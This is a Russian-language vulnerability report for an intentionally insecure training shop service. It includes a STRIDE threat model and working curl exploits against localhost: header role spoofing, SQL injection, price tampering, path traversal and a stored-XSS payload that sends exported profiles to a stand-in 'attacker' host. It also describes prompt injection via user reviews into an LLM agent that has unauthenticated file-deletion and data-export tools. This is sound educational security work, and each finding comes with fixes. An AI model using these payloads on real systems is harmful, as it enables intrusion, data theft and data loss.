# Отчет об уязвимостях: practices/practice_06/lab

Этот документ описывает модель угроз и ключевые уязвимости намеренно небезопасного сервиса магазина из папки `practices/practice_06/lab` (основные файлы: `service.py`, `sandbox.py`). Код в отчете не исправляется, цель — зафиксировать риски и способы эксплуатации.

## Архитектура и Модель угроз (STRIDE)

Компоненты и границы доверия:

- Клиент: любой локальный пользователь или скрипт, выполняющий HTTP-запросы к сервису.
- HTTP-сервис: `ThreadingHTTPServer` + обработчик `Shop.dispatch()` в `service.py`.
- БД: `SQLite` в памяти (`:memory:`), схема таблиц `profiles`, `orders` и начальные данные.
- Сессионное хранилище: `Shop.sessions` в памяти (token → {id, role}).
- Песочница файлов: `Sandbox` (`tempfile.TemporaryDirectory`), внутри создаются файлы `files/*` и `private/*`.
- LLM-агент: внешняя сущность, которой сервис выдает промпт (`/assistant/context`), а затем исполняет присланное решение (`/assistant/execute`) как «инструменты» (read_file, export_profiles, delete_tree) без авторизации.

```mermaid
flowchart TD
    subgraph Client[Клиент]
        U[Пользователь/скрипт]
        A[LLM-агент/клиент]
    end

    subgraph Service[HTTP-сервис (service.py)]
        D[dispatch()/REST эндпойнты]
        SESS[(sessions in memory)]
        LOGS[(logs in memory)]
    end

    subgraph DB[SQLite :memory:]
        PRO[profiles]
        ORD[orders]
    end

    subgraph FS[Sandbox (sandbox.py)]
        ROOT[/temp dir root/]
        FUSR[files/<user>/...]
        PRIV[private/operator-note.txt]
    end

    U -->|HTTP GET/POST| D
    A -->|GET /assistant/context| D
    A -->|POST /assistant/execute (tool, args)| D

    D <--> PRO
    D <--> ORD
    D <--> SESS
    D <--> LOGS
    D <--> ROOT
    ROOT --> FUSR
    ROOT --> PRIV

    classDef boundary stroke-dasharray: 5 5
    class Service,DB,FS boundary
```

STRIDE по ключевым направлениям:

- S (Spoofing): Подмена роли через произвольный заголовок `X-Role` в `/admin/export`; отсутствие проверки сессии в `/assistant/*`.
- T (Tampering): Массовое присваивание (mass assignment) цены в `POST /orders`; удаление/чтение произвольных путей через инструменты LLM; Path Traversal в `/files` для выхода из пользовательской папки.
- R (Repudiation): Логи доступны без защиты (`GET /debug/logs`), но могут быть изменены косвенно через вредоносные поля, нет аутентификации вызовов — спорность ответственности.
- I (Information disclosure): SQL-инъекции позволяют расширить выборку; экспорт профилей без авторизации; чтение чувствительных файлов в песочнице.
- D (Denial of Service): `delete_tree` может удалять каталоги в песочнице; потенциально стирает данные магазина (чеки).
- E (Elevation of Privilege): Вызов «админских» инструментов LLM (export_profiles/delete_tree) без проверки ролей; подмена роли через заголовок.

## Детальные уязвимости

### 1) Broken Access Control: подмена роли через `X-Role` в `/admin/export`

- Где в коде: `service.py` строки 74–77.
  - `if method == "GET" and url.path == "/admin/export":`
  - `if headers.get("X-Role") != "staff": return 403` — роль доверяется пользовательскому заголовку.
  - Нет проверки `X-Token` и роли из серверной сессии.
- Эксплуатация:
  ```bash
  curl -s http://127.0.0.1:8066/admin/export -H 'X-Role: staff'
  ```
  Ответом будут все профили пользователей.
- Влияние: неавторизованный экспорт персональных данных (PII) из таблицы `profiles`.
- Рекомендации: использовать сессионный токен (`X-Token`), роль определять по серверной сессии; игнорировать пользовательские заголовки ролей; внедрить middleware авторизации.

### 2) SQL-инъекции (f-строки)

- Где в коде:
  - `service.py:57` `/profile`: `SELECT * FROM profiles WHERE id = {query.get('id', '1')}`
  - `service.py:59` `/search`: `SELECT * FROM profiles WHERE name LIKE '%{query.get('q', '')}%'`
  - `service.py:89` `/assistant/context`: `SELECT * FROM orders WHERE id = {query.get('order_id', '1')}`
  - Метод `rows()` выполняет строковый SQL напрямую (`self.db.execute(query)`), без параметров.
- Эксплуатация:
  - Расширение выборки:
    ```bash
    curl -s 'http://127.0.0.1:8066/profile?id=1 OR 1=1'
    ```
  - Нарушение синтаксиса/манипуляции в LIKE:
    ```bash
    curl -s "http://127.0.0.1:8066/search?q=' OR '1'='1"
    ```
- Влияние: раскрытие данных, обход фильтров; потенциальное изменение запросов (в зависимости от движка; SQLite по умолчанию не допускает мульти-стейтмент в `execute`, но логические инъекции действуют).
- Рекомендации: строго использовать параметризованные запросы (`?` плейсхолдеры в sqlite3) и белые списки типов; экранировать и валидировать входы.

### 3) Mass Assignment: манипуляция ценой заказа в `POST /orders`

- Где в коде: `service.py` строки 63–73, ключевая строка 69: `price = body.get("price", self.products[product])`.
- Сервис доверяет клиенту параметр `price` и сохраняет его в БД без проверки.
- Эксплуатация:
  ```bash
  # 1) Логинимся как alice
  TOKEN=$(curl -s -X POST http://127.0.0.1:8066/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"learn-alice"}' | jq -r .token)

  # 2) Создаем заказ c ценой 1 рубль
  curl -s -X POST 'http://127.0.0.1:8066/orders' \
    -H 'X-Token: '$TOKEN -H 'Content-Type: application/json' \
    -d '{"product":"chair","price":1}'
  ```
- Влияние: финансовый ущерб, обход ценообразования; возможность отрицательных/аномальных значений.
- Рекомендации: цену вычислять исключительно на сервере по SKU; игнорировать/запрещать `price` от клиента; валидировать диапазоны; использовать неизменяемые прайс-листы и/или серверные котировки.

### 4) Path Traversal в файловой песочнице (`GET /files`)

- Где в коде:
  - `service.py:79–80`: `name = f"files/{user}/{path}"; self.sandbox.read(name)`
  - `sandbox.py:21–25` проверяет, что путь остается внутри корня песочницы, но не ограничивает доступом к папке конкретного пользователя (`files/<user>`). Это позволяет выйти из пользовательского каталога, оставаясь в корне песочницы.
- Эксплуатация (чтение «секретной» заметки оператора):
  ```bash
  curl -s 'http://127.0.0.1:8066/files?user=alice&path=../../private/operator-note.txt'
  ```
- Влияние: раскрытие чувствительных данных внутри песочницы (например, `private/operator-note.txt`).
- Рекомендации: нормализовать и жёстко фиксировать корень как `files/<current_user>/`; запрещать `..` и абсолютные пути; строить путь через безопасные API и проверять принадлежность каталогу пользователя (не только общему корню).

### 5) Stored XSS в `/reviews/view`

- Где в коде: `service.py:83–87` — отзывы сохраняются как есть, затем рендерятся в HTML: `"<p>{r['text']}</p>"` без экранирования.
- Эксплуатация:
  ```bash
  curl -s -X POST http://127.0.0.1:8066/reviews \
    -H 'Content-Type: application/json' \
    -d '{"product":"chair","text":"<script>fetch(\"/admin/export\").then(r=>r.text()).then(t=>navigator.sendBeacon(\"http://attacker\",t))</script>"}'

  curl -s http://127.0.0.1:8066/reviews/view  # выполнит скрипт в браузере жертвы
  ```
- Влияние: выполнение произвольного JS в контексте домена; кража токенов/данных, CSRF-подобные действия.
- Рекомендации: экранировать пользовательский ввод при выводе (HTML-escaping); хранить и отображать как текст; рассмотреть CSP (default-src 'self'; script-src 'none' или nonce/sha256); sanitize-библиотеки.

### 6) Векторы атак на LLM и отсутствие авторизации инструментов (`/assistant/*`)

- Где в коде:
  - `service.py:88–98` `/assistant/context` — формирует промпт, вставляя содержимое отзывов и заказов, включая потенциально вредоносный текст.
  - `service.py:99–109` `/assistant/execute` — исполняет присланное клиентом решение без проверки сессии и ролей:
    - `read_file(path)` → `self.sandbox.read(path)`
    - `export_profiles()` → SQL `SELECT * FROM profiles`
    - `delete_tree(path)` → `self.sandbox.delete_tree(path)`
- Проблемы:
  - Нет аутентификации/авторизации вообще: любой клиент может читать/удалять файлы и экспортировать профили.
  - Промпт-инъекция: отзывы (пользовательский контент) попадают в промпт, на который LLM «слепо» опирается при выборе инструмента, что может привести к действиям в интересах атакующего.
- Эксплуатация (прямой вызов без LLM):
  ```bash
  # Чтение приватного файла
  curl -s -X POST http://127.0.0.1:8066/assistant/execute \
    -H 'Content-Type: application/json' \
    -d '{"decision":{"tool":"read_file","arguments":{"path":"private/operator-note.txt"}}}'

  # Экспорт профилей
  curl -s -X POST http://127.0.0.1:8066/assistant/execute \
    -H 'Content-Type: application/json' \
    -d '{"decision":{"tool":"export_profiles"}}'

  # Удаление каталога с чеками
  curl -s -X POST http://127.0.0.1:8066/assistant/execute \
    -H 'Content-Type: application/json' \
    -d '{"decision":{"tool":"delete_tree","arguments":{"path":"files/alice"}}}'
  ```
- Влияние: раскрытие данных, несанкционированные операции, потеря данных (DoS на содержимое песочницы).
- Рекомендации: требовать `X-Token`, проверять роль и ACL для каждого инструмента; валидировать аргументы; ограничить доступ к путям; реализовать «policy enforcement point» перед исполнением; проектировать промпт устойчивым к инъекциям (role separation, инварианты, строгий JSON-интерфейс, контент-фильтрация).

## Дополнительные наблюдения

- Отсутствие аутентификации в `GET /orders` (service.py:60–61) — любой клиент видит все заказы, что ведет к утечке информации.
- Логи запроса доступны анонимно (`GET /debug/logs`, service.py:81–82) — помогает разведке атакующего, может раскрывать токены/заголовки.

## Приоритеты исправлений

1. Авторизация и аутентификация: убрать доверие к `X-Role`, подключить проверку `X-Token` и ролей для `/admin/export` и всех инструментов `/assistant/execute`.
2. SQL-инъекции: перейти на параметризованные запросы и валидацию входов.
3. Файловая безопасность: жёсткая привязка к каталогу пользователя, запрет traversal; в инструментах LLM — whitelist путей.
4. XSS: экранирование выводов и CSP.
5. Бизнес-логика: цену определять на сервере, удалить возможность передачи `price` клиентом.
6. Минимизировать утечки: ограничить/убрать `GET /debug/logs`, закрыть публичный `GET /orders` или фильтровать по владельцу.

## Ссылки на ключевые фрагменты кода

- service.py:57 (`/profile`), 59 (`/search`), 60–61 (`/orders` GET), 63–73 (`/orders` POST, присваивание цены), 74–77 (`/admin/export` с `X-Role`), 79–80 (`/files`), 83–87 (`/reviews` + XSS), 88–98 (`/assistant/context`), 99–109 (`/assistant/execute`).
- sandbox.py:21–25 (проверка пути только относительно корня), 27–29 (`read`), 30–36 (`delete_tree`).

Доклад подготовлен для учебных целей; все идентификаторы и данные синтетические (см. заголовок `service.py`).
